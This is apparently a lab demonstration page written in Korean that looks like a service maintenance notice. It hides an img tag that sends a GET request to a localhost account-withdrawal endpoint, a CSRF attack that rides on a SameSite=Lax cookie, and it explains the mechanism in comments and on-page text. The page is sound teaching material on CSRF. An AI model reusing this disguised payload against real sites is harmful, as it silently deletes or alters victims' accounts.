<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <title>서비스 공지사항</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 40px; background: #f9f9f9; }
    h1 { color: #1565c0; }
    .notice { background: white; border: 1px solid #ddd; padding: 24px;
              border-radius: 8px; max-width: 600px; margin: 0 auto; }
    .attack-info { margin-top: 30px; padding: 16px; background: #ffebee;
                   border-radius: 8px; font-size: 13px; }
    .log { margin-top: 16px; padding: 12px; background: #f5f5f5;
           border-radius: 6px; font-size: 12px; font-family: monospace; }
    .success { color: green; font-weight: bold; }
  </style>
</head>
<body>

  <div class="notice">
    <h1>📢 서비스 점검 안내</h1>
    <p>안녕하세요. 서비스 점검을 위해 일부 기능이 제한됩니다.</p>
    <p>이용에 불편을 드려 죄송합니다. 빠르게 복구하겠습니다.</p>

    <!--
      ============================================================
      [V3 GET CSRF 공격 원리]
      ============================================================
      피해자는 V3 모드로 로그인된 상태.
      AT 쿠키: HttpOnly=true, SameSite=Lax

      GET /api/user/withdraw — 이 엔드포인트는 GET 방식 (❌ 취약)
      SameSite=Lax: 기본적으로 GET 요청에 쿠키 전송 허용.
      특히 localhost 환경: 포트 무관 same-site 처리.

      img 태그의 src는 GET 요청 → AT 쿠키 자동 전송 → 탈퇴 처리!
      ============================================================
    -->

    <!-- ❌ 공격: 이 img 태그가 GET /api/user/withdraw 를 트리거 -->
    <img
      src="http://localhost:4001/api/user/withdraw"
      style="display:none"
      id="attackImg"
      onload="handleResult(true)"
      onerror="handleResult(false)"
    />
  </div>

  <div class="attack-info">
    <p><strong>🔍 공격 원리 설명</strong></p>
    <p>
      이 페이지를 열면 숨겨진 <code>&lt;img&gt;</code> 태그가
      <code>http://localhost:4001/api/user/withdraw</code>로
      GET 요청을 보냅니다.
    </p>
    <p>
      V3의 AT 쿠키는 <strong>SameSite=Lax</strong>이므로
      같은 도메인(localhost) 내 GET 요청에 쿠키가 자동 첨부됩니다.
      서버는 쿠키의 AT를 검증 후 <strong>계정 탈퇴를 실행</strong>합니다.
    </p>
    <div id="log" class="log">⏳ 공격 요청 전송 중...</div>
  </div>

  <script>
    function handleResult(success) {
      const log = document.getElementById('log');
      if (success) {
        log.innerHTML = `<span class="success">✅ 요청 완료! 피해자 계정이 탈퇴 처리되었을 수 있습니다.</span><br>
          V3 모드로 로그인 시도하면 "탈퇴된 계정" 오류가 표시됩니다.<br>
          <a href="http://localhost:3000/login" target="_blank">→ 로그인 페이지 확인</a>`;
      } else {
        log.innerHTML = `응답 수신 (이미지 로드 실패는 정상 — GET 요청은 성공했을 수 있음)<br>
          피해자가 V3 모드로 로그인한 상태인지 확인하세요.`;
      }
    }
  </script>
</body>
</html>
